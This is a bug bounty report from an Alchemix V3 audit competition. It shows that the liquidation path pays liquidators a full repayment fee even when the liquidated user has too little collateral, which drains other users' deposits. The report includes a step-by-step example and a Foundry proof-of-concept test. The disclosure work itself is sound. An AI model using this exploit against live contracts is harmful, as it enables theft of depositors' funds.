# 57138 sc critical protocol subsidizes repayment fees during liquidation

**Submitted on Oct 23rd 2025 at 19:32:38 UTC by @teoslaf1 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57138
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Protocol insolvency

## Description

## Summary

When a position with earmarked debt is liquidated and the user's collateral is insufficient, the protocol subsidizes the repayment fee from its own balance (other users' collateral). The `_resolveRepaymentFee` function calculates the full fee amount but can only deduct what's available from the user's depleted collateral, yet returns the full fee amount which is then paid from the contract's balance.

## Vulnerability Details

### Root Cause

The vulnerability exists in the liquidation flow when handling earmarked debt:

1. **`_forceRepay`** is called first (line 823):
   * Consumes the user's collateral to repay earmarked debt
   * Sends the repaid amount to the transmuter
   * User's `collateralBalance` is significantly reduced or depleted
2. **`_resolveRepaymentFee`** is called after (line 828):

   ```solidity
   function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
       Account storage account = _accounts[accountId];
       // calculate repayment fee and deduct from account
       fee = repaidAmountInYield * repaymentFee / BPS;  // @> Calculate full fee (1%)
       account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;  // @> Deduct only what's available (might be 0)
       emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
       return fee;  // @> Returns full calculated fee, not actual deducted amount
   }
   ```
3. **Fee Transfer** (line 830):

   ```solidity
   TokenUtils.safeTransfer(myt, msg.sender, feeInYield);  // @> Transfers full fee from contract balance
   ```

   This calls `myt.transfer(msg.sender, feeInYield)` which transfers tokens **from the AlchemistV3 contract's balance** to the liquidator.

### The Problem

* Line 907 deducts `min(fee, collateralBalance)` from the user's accounting(maybe 0 if depleted)
* Line 909 returns the full calculated fee amount
* Line 830 transfers this full fee from the contract's actual token balance to the liquidator
* The accounting shows less was deducted from the user than what was actually paid out
* The shortfall comes from the contract's balance, which contains other users' collateral

### Token Flow Explanation

* All user collateral is held in the AlchemistV3 contract's token balance
* `account.collateralBalance` is just an accounting entry tracking each user's share
* When `TokenUtils.safeTransfer(myt, recipient, amount)` is called, it transfers from the contract's actual balance
* If the accounting deducts less than what's transferred, the difference is taken from other users' funds

### Step-by-Step Example (matching test scenario)

```solidity
// Initial state (after price drop):
account.collateralBalance = 100_000e18 MYT (100k alETH worth)
account.earmarked = 90_000e18 alUSD (debt tokens, fully earmarked)
account.debt = 90_000e18 alUSD

// Step 1: _forceRepay(accountId, 90_000e18)
credit = min(90_000e18, 90_000e18) = 90_000e18 alUSD
creditToYield = convertDebtTokensToYield(90_000e18) = 90_000e18 MYT (assuming 1:1)

// @> Cap to available collateral:
creditToYield = min(90_000e18, 100_000e18) = 90_000e18 MYT
account.collateralBalance -= 90_000e18  // @> User's collateral reduced
// account.collateralBalance = 10_000e18 MYT remaining

// Protocol fee (assuming 0 for simplicity):
protocolFeeTotal = 0

// Transfer to transmuter:
TokenUtils.safeTransfer(myt, transmuter, 90_000e18)  // @> Sends to transmuter

// Return:
return 90_000e18  // @> Returns repaid amount

// Step 2: Back in _liquidate
repaidAmountInYield = 90_000e18  // @> Receives repaid amount

// After repayment, position becomes severely undercollateralized
// Liquidation occurs, consuming remaining 10_000e18 MYT collateral

// Step 3: _resolveRepaymentFee(accountId, 90_000e18)
fee = 90_000e18 * 100 / 10_000 = 900e18 MYT  // @> Calculate 1% fee (900 alETH)
account.collateralBalance -= min(900e18, 0) = 0  // @> Already 0! Nothing deducted!
return 900e18  // @> VULNERABILITY: Returns FULL fee despite deducting 0

// Step 4: Transfer fee to liquidator
TokenUtils.safeTransfer(myt, msg.sender, 900e18)  // @> this comes from the protocol/users
// Answer: From the contract's balance (other users' collateral)!

// Summary:
// - User's accounting: 0 deducted for repayment fee
// - Actual transfer: 900e18 MYT (~900 alETH) sent to liquidator
// - Protocol loss: 900e18 MYT (~$2.25M at $2500/ETH) from other users' funds
```

## Impact

### Direct Theft of User Funds

The vulnerability causes immediate theft of funds from the protocol's balance (other users' collateral at-rest):

* Liquidators receive fees that were never deducted from the liquidated user
* The shortfall is paid from the contract's balance containing other users' deposits
* This is not a rounding error or edge case - it's systematic theft on every undercollateralized liquidation

### Financial Loss Per Liquidation

With a 1% repayment fee:

* 100,000 alETH position → ~~900 alETH stolen (~~$2.25M at $2,500/ETH)
* 1,000,000 alETH position → ~~9,000 alETH stolen (~~$22.5M at $2,500/ETH)

The vulnerability creates systemic risk that threatens protocol solvency:

* During market crashes, many positions become undercollateralized simultaneously
* Each liquidation drains protocol reserves by 1% of the repaid amount
* Protocol continuously loses funds to liquidators without collecting from users
* Accumulated losses can lead to protocol insolvency
* Other users cannot withdraw their full collateral as reserves are depleted

## Proof of Concept

## Proof of Concept

### Add this test to AlchemistV3.t.sol

```solidity
  function testRepaymentFee_InsufficientCollateral_PaidFromProtocol() external {
        // Setup whale to ensure sufficient liquidity
        vm.startPrank(someWhale);
        IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
        vm.stopPrank();

        // Create a healthy position to keep global collateralization above minimum
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 2);
        alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // User deposits 100,000 alETH worth of collateral
        uint256 userDeposit = 100_000e18;
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), userDeposit + 100e18);
        alchemist.deposit(userDeposit, address(0xbeef), 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        uint256 mintAmount = alchemist.totalValue(tokenId) * FIXED_POINT_SCALAR / minimumCollateralization;
        alchemist.mint(tokenId, mintAmount, address(0xbeef));
        vm.stopPrank();

        // Create redemption to earmark debt
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
        transmuterLogic.createRedemption(mintAmount);
        vm.stopPrank();

        // Fast forward to fully earmark
        vm.roll(block.number + 5_256_000);

        // Drop price to make position severely undercollateralized
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        // Increase supply by 99.9% to drop price drastically
        uint256 modifiedVaultSupply = (initialVaultSupply * 9990 / 10_000) + initialVaultSupply;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        (uint256 collateralBefore,,) = alchemist.getCDP(tokenId);
        uint256 alchemistBalanceBefore = IERC20(address(vault)).balanceOf(address(alchemist));

        // Liquidate
        vm.prank(externalUser);
        alchemist.liquidate(tokenId);

        (uint256 collateralAfter,,) = alchemist.getCDP(tokenId);
        uint256 alchemistBalanceAfter = IERC20(address(vault)).balanceOf(address(alchemist));

        uint256 collateralDeducted = collateralBefore - collateralAfter;
        uint256 alchemistPaidOut = alchemistBalanceBefore - alchemistBalanceAfter;
        uint256 protocolLoss = alchemistPaidOut - collateralDeducted;

        console.log("User collateral deducted (alETH):", collateralDeducted / 1e18);
        console.log("Alchemist paid out (alETH):", alchemistPaidOut / 1e18);
        console.log("Protocol subsidized (alETH):", protocolLoss / 1e18);

        // Verify the vulnerability: protocol paid more than user's collateral
        assertGt(alchemistPaidOut, collateralDeducted, "Protocol should subsidize the fee");
        assertGt(protocolLoss, 0, "There should be a loss from protocol funds");

        // With 100k alETH and 1% repayment fee, protocol loses ~1000 alETH (~$2.5M at $2500/ETH)
        assertGt(protocolLoss, 900e18, "Protocol loss should be significant");
    }
```

### Test Output

```
User collateral deducted (alETH): 100000
Alchemist paid out (alETH): 101000
Protocol subsidized (alETH): 1000
```
